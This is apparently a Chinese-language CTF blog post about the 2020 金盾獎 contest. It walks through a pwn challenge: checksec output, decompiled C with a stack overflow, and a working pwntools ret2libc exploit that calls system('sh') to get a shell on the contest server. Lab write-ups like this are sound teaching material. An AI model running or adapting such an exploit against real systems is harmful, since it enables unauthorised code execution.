---
title: 2020年金盾獎
date: 2020-10-17 21:03:22
tags: pwn comps
---

## 心得寫在前
### 10/17 初賽
這是我第一次參加金盾獎

初賽的題目總共是四題，競賽時間是兩小時，然後我想抱怨一下:

官網寫包含很多類別，其中有Misc, 但其實每題都是Misc= = (+forensics)

然後工作人員好像自己也不太懂(?)，好這不重要，反正題目幾乎都是鑑識，我不會QQ

只解了第一題就進決賽xD

### 10/20 決賽
其實當初沒有想到會進決賽，想當然爾，我們是墊底進的Orz

今年的題目有所謂的 “教學題”，就是直接提供解法，但會扣分(400 -> 100)

似乎是怕有人會掛蛋嘛XDDDD

賽中出題者好像不太懂分類(?)，把Web出到Pwn去，然後Reverse = Pwn

最後我們燒雞，我解出一題(唯一的)PWN(假Reverse)，然後隊友開了Crypto_教學題的題示

然後就拿到第三了XDD，直接拿一萬回家

### 決賽
<!-- more -->
這次我唯一解出的題目是 Reverse_教學題

雖說是reverse啦，但看題敘可以明顯看出是有關Buffer Overflow，我引用一小段:

`…小明發現輸入過長的資料會導致 Segmentation Fault…`
看到這邊大概就有底了，然後再打開Binary:

#### 保護機制
```bash
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
開了NX, 沒開Canary，很明顯是要stack overflow，接著看組語:
#### 分析:
`main()`:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  checkInfo();
  system("exit");
  return 0;
}
```
呼叫了`checkInfo()`, 接著就exit，注意這邊用了`system()`

`checkInfo()`:
```c
void checkInfo()
{
  char password[10]; // [esp+16h] [ebp-412h]
  char account[1024]; // [esp+20h] [ebp-408h]

  memset(account, 0, sizeof(account));
  *(_DWORD *)password = 0;
  *(_DWORD *)&password[4] = 0;
  *(_WORD *)&password[8] = 0;
  printf("Please input account: ");
  fflush(stdout);
  fflush(stdin);
  fgets(account, 10240, stdin);
  if ( strchr(account, 64) )
  {
    printf("account is : ");
    fflush(stdout);
    printf(account);
    fflush(stdout);
    putchar(10);
  }
  else
  {
    puts("account failed");
  }
  fflush(stdout);
  printf("Please input password: ");
  fflush(stdout);
  fflush(stdin);
  fgets(password, 1024, stdin);
  if ( !strcmp(password, "123456") )
  {
    printf("password is : ");
    fflush(stdout);
    printf(password);
    fflush(stdout);
    putchar(10);
  }
  else
  {
    puts("password failed");
  }
  fflush(stdout);
}
```
這邊可以看到`password[10], account[1024]`，但`fgets()`讀了10240，明顯的buffer overflow

指向`system@plt`，接著布置參數就好
#### exploit
```python
#!/usr/bin/env python2
from pwn import *
import pwnlib.elf
context.log_level = 'debug'

e = ELF('./check_passwd')
p = process('./check_passwd')
p = remote('10.3.202.18', 6666)

payload = '\x00'*1036
payload += p32(e.symbols['system'])
payload += p32(e.symbols['main'])
payload += p32(e.search('sh').next())

p.sendlineafter(':', payload)
#p.sendline('A')

p.interactive()
p.close()
```